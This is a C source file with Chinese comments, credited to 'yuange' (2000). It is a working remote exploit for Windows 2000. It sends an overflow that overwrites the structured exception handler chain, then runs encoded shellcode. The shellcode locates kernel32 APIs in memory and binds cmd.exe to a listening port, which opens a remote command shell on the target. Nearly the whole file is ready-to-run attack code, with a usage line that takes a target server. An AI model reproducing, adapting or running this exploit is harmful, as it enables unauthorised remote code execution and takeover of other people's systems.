/*
  利用异常结构绕过溢出保护攻击的攻击程序exover.c。
  上面程序运行在win2000下此攻击程序溢出成功。
  vc6.0下编译通过。
  yuange@nsfocus.com
*/


/*
  except overflow program ver 1.0
  copy by yuange <yuange@163.net>  2000。06。20
*/

#include <windows.h>
#include <winsock.h>
#include <stdio.h>

#define  FNENDLONG     0x08
#define  NOPCODE       0x90
#define  NOPLONG       0x20
#define  BUFFSIZE      0x20000
#define  RETEIPADDRESS 0x0
#define  SHELLPORT     0x1f90
/* 0x1f90=8080 */
#define  WEBPORT       1080

void shellcodefnlock();
void shellcodefn();

void cleanchkesp(char *fnadd, char *shellbuff, char *chkespadd, int len);

int main(int argc, char **argv) {
    char *server;
    
    char *str = "\x1f\x90"
        "LoadLibraryA""\x0"
        "CreatePipe""\x0"
        "CreateProcessA""\x0"
        "CloseHandle""\x0"
        "PeekNamedPipe""\x0"
        "ReadFile""\x0"
        "WriteFile""\x0"
        "wsock32.dll""\x0"
        "socket""\x0"
        "bind""\x0"
        "listen""\x0"
        "accept""\x0"
        "send""\x0"
        "recv""\x0"
        "ioctlsocket""\x0"
        "closesocket""\x0"
        "cmd.exe""\x0"
        "exit\x0d\x0a""\x0"
        "strend";
/*  shellcode用到的api名等字符串 */

    char *fnendstr = "\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    char eipwinnt[] = "\x63\x0d\xfa\x7f"; /*   jmp ebx  address */
/*
  win2000发生异常时ebx指向异常结构，
  winnt 有的版本是esi,有的版本是edi
*/
    char  JMPNEXTJMP[] = "\x90\x90\x90\x2d";
/*
  0x2d  sub eax,num32
  用于平衡后面的4字节任意代码，使得连续覆盖溢出点的这段代码指令等效于NOP
*/
    char    JMPSHELL[] = "\xe9\x40\xf0\xff\xff";
    char    buff[BUFFSIZE];
    char    recvbuff[BUFFSIZE];
    char    shellcodebuff[0x1000];
    struct  sockaddr_in s_in2,s_in3;
    struct  hostent *he;
    char    *shellcodefnadd,*chkespadd;
    unsigned  int sendpacketlong;
    int i,j,k;
    unsigned  char temp;
    int     fd;
    u_short port,port1,shellcodeport;
    SOCKET  d_ip;
    WSADATA wsaData;
    int offset = 0;
    int OVERADD = RETEIPADDRESS;
    int OVERADD2 = 0xfb8;
    int result =  WSAStartup(MAKEWORD(1, 1), &wsaData);
    if (result !=  0) {
        fprintf(stderr, "Your computer was not connected "
                "to the Internet at the time that "
                "this program was launched, or you "
                "do not have a 32-bit "
                "connection to the Internet.");
        exit(1);
    }

    if (argc > 3) {
        port = atoi(argv[3]);
    } else {
        port = WEBPORT;
    }

    if (argc < 2) {
        WSACleanup();
        fprintf(stderr, "\n except over 1.0.");
        fprintf(stderr, "\n copy by yuange 2000.06.20.");
        fprintf(stderr, "\n welcome to my homepage http://yuange.yeah.net
.");
        fprintf(stderr, "\n usage: %s <server> [shellport] [webport] \n", argv[0]);
        exit(1);
    } else {
        server  =  argv[1];
    }
    
    d_ip = inet_addr(server);
    if (d_ip == -1) {
        he = gethostbyname(server);
        if (!he) {
            WSACleanup( );
            printf("\n Can't get the ip of %s !\n",server);
            exit(1);
        } else {
            memcpy(&d_ip, he->h_addr, 4);
        }
    }

    fd = socket(AF_INET, SOCK_STREAM,0);
    i = 8000;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (const char *) &i, sizeof(i));

    s_in3.sin_family = AF_INET;
    s_in3.sin_port = htons(port);
    s_in3.sin_addr.s_addr = d_ip;
    printf("\n nuke ip: %s port %d", inet_ntoa(s_in3.sin_addr), htons(s_in3.sin_port));

    if (connect(fd, (struct sockaddr *)&s_in3, sizeof(struct sockaddr_in)) != 0) {
        closesocket(fd);
        WSACleanup();
        fprintf(stderr, "\n  connect err.");
        exit(1);
    }

    _asm{   mov ESI,ESP
            cmp ESI,ESP
            }
    
    _chkesp();
    chkespadd = _chkesp;
    temp =* chkespadd;
    if (temp == 0xe9) {
        ++chkespadd;
        i = *(int*)chkespadd;
        chkespadd += i;
        chkespadd += 4;
    }

    shellcodefnadd = shellcodefnlock;
    temp =* shellcodefnadd;
    if (temp == 0xe9) {
        ++shellcodefnadd;
        k = *(int *)shellcodefnadd;
        shellcodefnadd += k;
        shellcodefnadd += 4;
    }

    for (k = 0; k <= 0x500; ++k){
        if (memcmp(shellcodefnadd + k, fnendstr, FNENDLONG) == 0) {
            break;
        }
    }

    memset(buff, NOPCODE, BUFFSIZE);
    memcpy(buff + OVERADD + NOPLONG, shellcodefnadd + k + 4, 0x80);

    shellcodefnadd = shellcodefn;
    temp =* shellcodefnadd;
    if (temp == 0xe9) {
        ++shellcodefnadd;
        k =* (int *)shellcodefnadd;
        shellcodefnadd += k;
        shellcodefnadd += 4;
    }

    for (k = 0; k <= 0x1000; ++k) {
        if (memcmp(shellcodefnadd + k, fnendstr, FNENDLONG) == 0) {
            break;
        }
    }

    memcpy(shellcodebuff, shellcodefnadd, k);
    cleanchkesp(shellcodefnadd, shellcodebuff, chkespadd,k);

    for (i = 0; i < 0x400; ++i) {
        if (memcmp(str + i, "strend", 6) == 0) {
            break;
        }
    }  
    memcpy(shellcodebuff + k, str, i);

    if(argc>2)  shellcodeport=atoi(argv[2]);
    else        shellcodeport=SHELLPORT;

    if(shellcodeport==0) shellcodeport=SHELLPORT;
    shellcodeport=htons(shellcodeport);
    *(u_short *)(shellcodebuff+k)=shellcodeport;
    fprintf(stderr,"\n shellport %d",htons(shellcodeport));


    sendpacketlong=k+i;
    for(k=0;k<=0x200;++k){
        if(memcmp(buff+OVERADD+NOPLONG+k,fnendstr,FNENDLONG)==0) break;
    }

    for(i=0;i<sendpacketlong;++i){
        temp=shellcodebuff[i];
        if(temp<=0x10||temp=='0'){
/*    对shellcode的特殊字符编码   */
            buff[OVERADD+NOPLONG+k]='0';
            ++k;
            temp+=0x40;
        }
        buff[OVERADD+NOPLONG+k]=temp;
        ++k;
    }

  
    for(i=-0x30;i<0x20;i+=8){
        memcpy(buff+OVERADD2+i,JMPNEXTJMP,4);
/*
  覆盖异常结构的下一个异常链next数据，发生异常时ebx制向这
  与通常的发生溢出时ESP指向溢出代码附近不一样，发生异常时
  的ESP不在这附近
*/   
        memcpy(buff+OVERADD2+i+4,eipwinnt,4);
/*
  覆盖异常结构的程序指针
  发生异常时会转到这指针去运行
  这覆盖的是一个jmp ebx指令的地址
*/
    }
/*
  连续覆盖，增大覆盖掉异常结构的可能性
*/
    memcpy(buff+OVERADD2+8,JMPSHELL,5);
/*
  跳到shellcode去的跳转代码，远跳转。
*/
    sendpacketlong=0x1000-0x10;

    for(i=0;i<1;++i){
        j=sendpacketlong;
        fprintf(stderr,"\n send  packet %d bytes.",j);
        send(fd,buff,j,0);
        k=recv(fd,recvbuff,0x1000,0);
        if(k>0){
            recvbuff[k]=0;
            fprintf(stderr,"\n  recv:\n %s",recvbuff);
        }
    }
    closesocket(fd);
    WSACleanup( );
    return(0);
}

void shellcodefnlock() {
    _asm{   nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
/* 用于定位下面一小段汇编指令的NOP 串 */
            jmp   next
            getediadd:
            pop   EDI
            push  EDI
            pop   ESI
            xor   ecx, ecx
            mov   cx, 0x0fd0
            looplock:
            lodsb
            cmp   al,0x30
            jnz   sto
            lodsb
            sub   al,0x40
            sto:
            stosb
            loop  looplock
            jmp   shell
            next:
            call  getediadd
/*  解码shellcode */
            shell:
            NOP
            NOP
            NOP
            NOP
            NOP
            NOP
            NOP
            NOP
            }
}


/* 真正实现功能的shellcode */
/* 本shellcode实现开端口绑定cmd.exe 的功能 */
void shellcodefn() {
    char        Buff[0x800];
    int         *except[3];

    FARPROC     closesocketadd;
    FARPROC     ioctlsocketadd;
    FARPROC     recvadd;
    FARPROC     sendadd;
    FARPROC     acceptadd;
    FARPROC     listenadd;
    FARPROC     bindadd;
    FARPROC     socketadd;
/*     FARPROC     WSAStartupadd;  */

    FARPROC     NOPNOP;

    FARPROC     WriteFileadd;
    FARPROC     ReadFileadd;
    FARPROC     PeekNamedPipeadd;
    FARPROC     CloseHandleadd;
    FARPROC     CreateProcessadd;
    FARPROC     CreatePipeadd;
    FARPROC  procloadlib;

    FARPROC     apifnadd[1];
    FARPROC     procgetadd=0;

    char        *stradd;
    int         imgbase,fnbase,k,l;
    HANDLE      libhandle;
    STARTUPINFO siinfo;
    SOCKET      listenFD,clientFD;
    struct      sockaddr_in server;
    int         iAddrSize = sizeof(server);
    int         lBytesRead;
    u_short     shellcodeport;

    PROCESS_INFORMATION ProcessInformation;
    HANDLE      hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2;
    SECURITY_ATTRIBUTES sa;
    _asm {  jmp    nextcall
            getstradd:
            pop    stradd
            lea    EDI, except
            mov    eax, dword ptr FS:[0]
            mov    dword ptr [edi+0x08], eax
            mov    dword ptr FS:[0], EDI
            }
    
    except[0]=0xffffffff;
    except[1]=stradd-0x07;

    imgbase=0x77e00000;
    
    _asm{ call getexceptretadd }
    
    for(;imgbase<0xbffa0000,procgetadd==0;){
        imgbase+=0x10000;
        if(imgbase==0x78000000) imgbase=0xbff00000;
        if(*( WORD *)imgbase=='ZM'&& *(WORD *)(imgbase+*(int
                                                         *)(imgbase+0x3c))=='EP'){
            fnbase=*(int *)(imgbase+*(int *)(imgbase+0x3c)+0x78)+imgbase;
            k=*(int *)(fnbase+0xc)+imgbase;
            if(*(int *)k =='NREK'&&*(int *)(k+4)=='23LE'){
                libhandle=imgbase;
                k=imgbase+*(int *)(fnbase+0x20);
                for(l=0;l<*(int *) (fnbase+0x18);++l,k+=4){
                    if(*(int *)(imgbase+*(int *)k)=='PteG'&&*(int *)(4+imgbase+*(int
                                                                                 *)k)=='Acor'){
                        k=*(WORD *)(l+l+imgbase+*(int *)(fnbase+0x24));
                        k+=*(int *)(fnbase+0x10)-1;
                        k=*(int *)(k+k+k+k+imgbase+*(int *)(fnbase+0x1c));
                        procgetadd=k+imgbase;
                        break;
                    }
                }
            }
        }
    }
/*
  搜索KERNEL32。DLL模块地址和API函数 GetProcAddress地址
  注意这儿处理了搜索页面不在情况。
*/

    _asm{   lea edi, except
            mov eax, dword ptr [edi+0x08]
            mov dword ptr fs:[0], eax
            }


    if (procgetadd==0) goto  die ;

    shellcodeport=*(u_short *)stradd;
    stradd+=2;
    for(k=1;k<17;++k) {
        if(k==8) libhandle=procloadlib(stradd);
        else     apifnadd[k]=procgetadd(libhandle,stradd);
        for(;;++stradd){
            if(*(stradd)==0&&*(stradd+1)!=0) break;
        }
        ++stradd;
    }

/*    WSAStartupadd(MAKEWORD(1, 1), &wsaData);  */
    listenFD = socketadd(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    server.sin_family = AF_INET;
    server.sin_port =shellcodeport;
    server.sin_addr.s_addr=0;

    k=1;
    while(k!=0){
        k=bindadd(listenFD,&server,sizeof(server));
        server.sin_port+=0x100;
        if(server.sin_port<0x100) ++server.sin_port;
    }
    listenadd(listenFD,10);

    while(1){

        clientFD=acceptadd(listenFD,&server,&iAddrSize);
        sa.nLength=12;
        sa.lpSecurityDescriptor=0;
        sa.bInheritHandle=TRUE;

        CreatePipeadd(&hReadPipe1,&hWritePipe1,&sa,0);
        CreatePipeadd(&hReadPipe2,&hWritePipe2,&sa,0);

/* ZeroMemory(&siinfo,sizeof(siinfo));  */
        _asm{
            lea EDI,siinfo
                xor eax,eax
                mov ecx,0x11
                repnz stosd
                }
        siinfo.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
        siinfo.wShowWindow = SW_HIDE;
        siinfo.hStdInput = hReadPipe2;
        siinfo.hStdOutput=hWritePipe1;
        siinfo.hStdError =hWritePipe1;


        k=CreateProcessadd(NULL,stradd,NULL,NULL,1,0,NULL,NULL,&siinfo,&ProcessInfor
                           mation);

        PeekNamedPipeadd(hReadPipe1,Buff,1024,&lBytesRead,0,0);


/*
  k=1;
  ioctlsocketadd(clientFD, FIONBIO, &k);
*/
/*
  还是阻塞模式比较好，占用CPU时间少，要不下面死掉的时候就老占用CPU，
  造成受攻击系统反应比较慢。
*/
        while(1){
            PeekNamedPipeadd(hReadPipe1,Buff,1024,&lBytesRead,0,0);
            if(lBytesRead>0) {
                ReadFileadd(hReadPipe1,Buff,lBytesRead,&lBytesRead,0);
                if(lBytesRead>0) sendadd(clientFD,Buff,lBytesRead,0);
                else sendadd(clientFD,stradd,8,0);
            }
            else{
                lBytesRead=recvadd(clientFD,Buff,1024,0);
                if(lBytesRead<=0){
                    lBytesRead=6;
                    WriteFileadd(hWritePipe2,stradd+8,lBytesRead,&lBytesRead,0);
                    closesocketadd(clientFD);
                    break;
/*
  TELNET连接中断，退出等到再一次连接
*/         }
                else{
                    sendadd(clientFD,Buff,lBytesRead,0);
/*
  回显，有些TELNET不能设置本地响应会看不到命令输入很不方便。
*/
                    WriteFileadd(hWritePipe2,Buff,lBytesRead,&lBytesRead,0);
                }
            }
        }
    }




die: goto die  ;
    _asm{

    getexceptretadd:   pop  eax
            push eax
            mov  edi,dword ptr [stradd]
            mov dword ptr [edi-0x0e],eax
            ret
            errprogram:        mov eax,dword ptr [esp+0x0c]
        add eax,0xb8
        mov dword ptr [eax],0x11223344
/* stradd-0xe  */
        xor eax,eax
/* 2  bytes */
        ret
/* 1  bytes */
        execptprogram:     jmp errprogram
/* 2 bytes  stradd-7  */
        nextcall:          call getstradd
/* 5 bytes */
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        }
}



/*
  清除shellcdoe里面的chkesp调用
*/
void cleanchkesp(char *fnadd,char *shellbuff,char * chkesp,int len)
{
    int i,k;
    unsigned char temp;
    char *calladd;

    for(i=0;i<len;++i){
        temp=shellbuff[i];
        if(temp==0xe8){
            k=*(int *)(shellbuff+i+1);
            calladd=fnadd;
            calladd+=k;
            calladd+=i;
            calladd+=5;
            if(calladd==chkesp){
                shellbuff[i]=0x90;
                shellbuff[i+1]=0x43;   // inc ebx
                shellbuff[i+2]=0x4b; // dec ebx
                shellbuff[i+3]=0x43;
                shellbuff[i+4]=0x4b;
            }
        }
    }
}
